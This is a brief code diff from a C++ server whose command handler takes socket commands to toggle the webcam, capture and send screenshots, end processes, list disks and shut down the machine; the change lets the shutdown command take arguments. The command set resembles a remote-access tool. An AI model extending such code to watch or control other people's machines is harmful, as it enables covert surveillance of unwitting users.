@@ -238,7 +238,7 @@ void Server::handleClient(const SOCKET client_socket) {
         } else if (strcmp(buffer, "!webcam") == 0)
             toggleWebcam();
 
-        else if (strcmp(buffer, "!shutdown") == 0)
+        else if (strstr(buffer, "!shutdown ") != nullptr)
             Shutdown(buffer);
 
         else if (strstr(buffer, "!endp ") != nullptr)
@@ -253,6 +253,7 @@ void Server::handleClient(const SOCKET client_socket) {
         else if (strcmp(buffer, "!capture") == 0) {
             capture(image);
             SendImage(image, client_socket);
+
         } else if (strcmp(buffer, "!list disks") == 0)
             ShowAvailableDisks();
 
